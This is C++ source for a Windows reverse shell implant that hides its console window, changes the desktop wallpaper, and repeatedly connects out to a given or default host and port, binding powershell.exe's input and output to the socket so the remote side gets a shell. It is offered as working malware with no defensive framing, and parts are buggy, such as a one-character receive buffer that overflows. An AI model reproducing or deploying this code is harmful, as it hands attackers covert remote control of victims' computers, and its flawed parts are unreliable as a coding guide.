#include <winsock2.h>
#include <windows.h>
#include <string.h>
#include <iostream>
#include <ws2tcpip.h>
#pragma warning(disable:4996) 
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

void wallpaper() {
	const wchar_t* path = L"C:\\lol.png";
	int result;
	result = SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void*)path, SPIF_UPDATEINIFILE);
	std::cout << result;
}

void shell(char* server, int port) {
	while (true) {
		Sleep(4000);
		SOCKET sock; sockaddr_in addr; WSADATA version;
		WSAStartup(MAKEWORD(2, 2), &version);
		sock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
		addr.sin_family = AF_INET;
		//InetPton(AF_INET, _T(server), &addr.sin_addr.s_addr);
		addr.sin_addr.s_addr = inet_addr(server);
		addr.sin_port = htons(port);
		if (WSAConnect(sock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
			closesocket(sock);
			WSACleanup();
			continue;
		}
		else {
			char Data(DEFAULT_BUFLEN);
			memset(&Data, 0, sizeof(Data));
			int code = recv(sock, &Data, DEFAULT_BUFLEN, 0);
			if (code <= 0) {
				closesocket(sock);
				WSACleanup();
				continue;
			}
			else {
				char Proc[] = "powershell.exe";
				STARTUPINFO sinfo; PROCESS_INFORMATION pinfo;
				memset(&sinfo, 0, sizeof(sinfo));
				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
				sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)sock;
				CreateProcessA(NULL, Proc, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
				WaitForSingleObject(pinfo.hProcess, INFINITE);
				CloseHandle(pinfo.hProcess);
				CloseHandle(pinfo.hThread);
				memset(&Data, 0, sizeof(Data));
				int RecvCode = recv(sock, &Data, DEFAULT_BUFLEN, 0);
				if (code <= 0) {
					closesocket(sock);
					WSACleanup();
					continue;
				}
				if (std::strcmp(&Data, "exit\n") == 0) {
					exit(0);
				}
			}
		}

	}
}

int main(int argc, char** argv) {
	FreeConsole();
	wallpaper();
	if (argc == 3) {
		int port = atoi(argv[2]);
		shell(argv[1], port);
	}
	else {
		char host[] = "127.0.0.1";
		int port = 4545;
		shell(host, port);
	}
	return 0;
}